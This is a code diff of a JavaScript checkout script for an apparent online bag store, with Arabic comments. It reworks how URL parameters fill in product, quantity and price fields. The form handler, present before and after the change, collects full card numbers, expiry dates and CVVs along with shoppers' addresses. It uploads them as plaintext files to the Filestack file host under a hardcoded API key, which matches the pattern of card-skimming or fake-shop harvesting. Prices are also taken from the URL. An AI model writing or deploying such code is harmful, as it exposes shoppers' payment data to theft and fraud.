@@ -14,130 +14,136 @@ document.addEventListener('DOMContentLoaded', function () {
 
   const urlParams = getUrlParams();
 
-  // تأكد من وجود المعلمات في الرابط وطباعة القيم للتأكد
-  console.log('Received URL Params:', urlParams);
+  // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
+  document.getElementById('product-name').textContent = `Name: ${urlParams.name || ''}`;
+  document.getElementById('product-color').textContent = `Color: ${urlParams.color || ''}`;
+  document.getElementById('product-price').textContent = `Price: ${urlParams.price || ''}`;
+  document.getElementById('total-price').textContent = `Total Price: ${urlParams.total || ''}`;
 
-  // التحقق من وجود المعلمات قبل استخدامها
-  if (urlParams.name && urlParams.color && urlParams.price && urlParams.total) {
-    // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
-    document.getElementById('product-name').textContent = `Name: ${urlParams.name}`;
-    document.getElementById('product-color').textContent = `Color: ${urlParams.color}`;
-    document.getElementById('product-price').textContent = `Price: ${urlParams.price}`;
-    document.getElementById('total-price').textContent = `Total Price: ${urlParams.total}`;
-  } else {
-    // في حال عدم وجود المعلمات، اعرض رسالة خطأ أو قيمة افتراضية
-    console.error('Missing product information in URL parameters.');
-    document.getElementById('product-name').textContent = 'Name: N/A';
-    document.getElementById('product-color').textContent = 'Color: N/A';
-    document.getElementById('product-price').textContent = 'Price: N/A';
-    document.getElementById('total-price').textContent = 'Total Price: N/A';
+  // عرض الصورة
+  const productImage = document.getElementById('product-image');
+  if (urlParams.imageUrl) {
+    productImage.src = urlParams.imageUrl;  // رابط الصورة
+    productImage.alt = `${urlParams.name} image`;  // نص بديل للصورة
   }
+
+  // عرض الكمية
+  const productQuantity = parseInt(urlParams.quantity, 10) || 1; // تعيين الكمية الافتراضية إلى 1 إذا لم يتم إرسالها
+  document.getElementById('product-quantity').textContent = `Quantity: ${productQuantity}`;
+
+  // حساب السعر الإجمالي
+  const productPrice = parseFloat(urlParams.price) || 0; // تحويل السعر إلى عدد عشري
+  const totalPrice = (productPrice * productQuantity).toFixed(2); // حساب السعر الإجمالي
+  document.getElementById('total-price').textContent = `Total Price: $${totalPrice}`;
 
   // إضافة مستمع للإرسال
   form.addEventListener('submit', function (event) {
-      event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال
+    event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال
 
-      // جمع البيانات من الحقول
-      const email = document.getElementById('email').value;
-      const firstName = document.getElementById('first-name').value;
-      const lastName = document.getElementById('last-name').value;
-      const streetHouseApartmentUnit = document.getElementById('street-house-apartment-unit').value;
-      const city = document.getElementById('city').value;
-      const state = document.getElementById('state').value;
-      const zipCode = document.getElementById('zip-code').value;
-      const cardName = document.getElementById('card-name').value;
-      const cardNumber = document.getElementById('card-number').value;
-      const expiry = document.getElementById('expiry').value;
-      const cvv = document.getElementById('cvv').value;
+    // جمع البيانات من الحقول
+    const email = document.getElementById('email').value;
+    const firstName = document.getElementById('first-name').value;
+    const lastName = document.getElementById('last-name').value;
+    const streetHouseApartmentUnit = document.getElementById('street-house-apartment-unit').value;
+    const city = document.getElementById('city').value;
+    const state = document.getElementById('state').value;
+    const zipCode = document.getElementById('zip-code').value;
+    const cardName = document.getElementById('card-name').value;
+    const cardNumber = document.getElementById('card-number').value;
+    const expiry = document.getElementById('expiry').value;
+    const cvv = document.getElementById('cvv').value;
 
-      // معلومات المنتج
-      const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
-      const productPrice = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
-      const productQuantity = 1;  // هنا يمكن تعيين كمية المنتج من الرابط إذا تم إرسالها
+    // معلومات المنتج
+    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
+    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
+    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
+    const productImageUrl = urlParams.imageUrl || '';  // رابط الصورة
 
-      // تحقق من القيم
-      let isValid = true;
+    // تحقق من القيم
+    let isValid = true;
 
-      removeErrorMessages();  // إزالة رسائل الخطأ السابقة
+    removeErrorMessages();  // إزالة رسائل الخطأ السابقة
 
-      // تحقق من الحقول الفارغة
-      if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !cardName || !cardNumber || !expiry || !cvv) {
-          isValid = false;
-          showErrorMessage('Please fill out all required fields.', 'general');
-      }
+    // تحقق من الحقول الفارغة
+    if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !cardName || !cardNumber || !expiry || !cvv) {
+        isValid = false;
+        showErrorMessage('Please fill out all required fields.', 'general');
+    }
 
-      // تحقق من صحة البريد الإلكتروني
-      if (!validateEmail(email)) {
-          isValid = false;
-          showErrorMessage('Please enter a valid email address.', 'email');
-      }
+    // تحقق من صحة البريد الإلكتروني
+    if (!validateEmail(email)) {
+        isValid = false;
+        showErrorMessage('Please enter a valid email address.', 'email');
+    }
 
-      // تحقق من اسم حامل البطاقة
-      if (!validateCardName(cardName)) {
-          isValid = false;
-          showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
-      }
+    // تحقق من اسم حامل البطاقة
+    if (!validateCardName(cardName)) {
+        isValid = false;
+        showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
+    }
 
-      // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
-      if (!validateCard(cardNumber)) {
-          isValid = false;
-          showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
-      }
+    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
+    if (!validateCard(cardNumber)) {
+        isValid = false;
+        showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
+    }
 
-      // تحقق من تاريخ الصلاحية
-      if (!validateExpiry(expiry)) {
-          isValid = false;
-          showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
-      }
+    // تحقق من تاريخ الصلاحية
+    if (!validateExpiry(expiry)) {
+        isValid = false;
+        showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
+    }
 
-      // تحقق من CVV
-      if (!validateCVV(cvv)) {
-          isValid = false;
-          showErrorMessage('Please enter a valid CVV number.', 'cvv');
-      }
+    // تحقق من CVV
+    if (!validateCVV(cvv)) {
+        isValid = false;
+        showErrorMessage('Please enter a valid CVV number.', 'cvv');
+    }
 
-      if (isValid) {
-          // إنشاء محتوى الملف النصي مع بيانات المنتج
-          const orderData = ` 
-              Email: ${email}
-              First Name: ${firstName}
-              Last Name: ${lastName}
-              Street_House_Apartment_Unit: ${streetHouseApartmentUnit}
-              City: ${city}
-              State: ${state}
-              Zip Code: ${zipCode}
-              Cardholder's Name: ${cardName}
-              Card Number: ${cardNumber}
-              Expiry Date: ${expiry}
-              CVV: ${cvv}
+    if (isValid) {
+        // إنشاء محتوى الملف النصي مع بيانات المنتج
+        const orderData = ` 
+            Email: ${email}
+            First Name: ${firstName}
+            Last Name: ${lastName}
+            Street_House_Apartment_Unit: ${streetHouseApartmentUnit}
+            City: ${city}
+            State: ${state}
+            Zip Code: ${zipCode}
+            Cardholder's Name: ${cardName}
+            Card Number: ${cardNumber}
+            Expiry Date: ${expiry}
+            CVV: ${cvv}
 
-              --- Product Details ---
-              Product Name: ${productName}
-              Product Price: ${productPrice}
-              Product Quantity: ${productQuantity}
-          `;
-          
-          // تحويل البيانات إلى Blob (بيانات ثنائية)
-          const blob = new Blob([orderData], { type: 'text/plain' });
+            --- Product Details ---
+            Product Name: ${productName}
+            Product Price: $${productPriceText}
+            Product Quantity: ${productQuantityText}
+            Product Image URL: ${productImageUrl}
+            Total Price: $${totalPrice}
+        `;
+        
+        // تحويل البيانات إلى Blob (بيانات ثنائية)
+        const blob = new Blob([orderData], { type: 'text/plain' });
 
-          // إعدادات Filestack API
-          const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
-          const client = filestack.init(apiKey);
+        // إعدادات Filestack API
+        const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
+        const client = filestack.init(apiKey);
 
-          // رفع الملف إلى Filestack
-          client.upload(blob)
-              .then(result => {
-                  // عند نجاح رفع الملف
-                  alert('Your order has been successfully placed and saved to Filestack!');
-                  window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه إلى صفحة الشكر
-                  console.log(result);  // تفاصيل رفع الملف
-              })
-              .catch(error => {
-                  // في حال حدوث خطأ
-                  console.error('Error uploading file to Filestack:', error);
-                  alert('Something went wrong, please try again later.');
-              });
-      }
+        // رفع الملف إلى Filestack
+        client.upload(blob)
+            .then(result => {
+                // عند نجاح رفع الملف
+                alert('Your order has been successfully placed and saved to Filestack!');
+                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه إلى صفحة الشكر
+                console.log(result);  // تفاصيل رفع الملف
+            })
+            .catch(error => {
+                // في حال حدوث خطأ
+                console.error('Error uploading file to Filestack:', error);
+                alert('Something went wrong, please try again later.');
+            });
+    }
   });
 });
 
@@ -225,6 +231,7 @@ document.querySelectorAll('input').forEach(input => {
       }
   });
 });
+
 
 
 
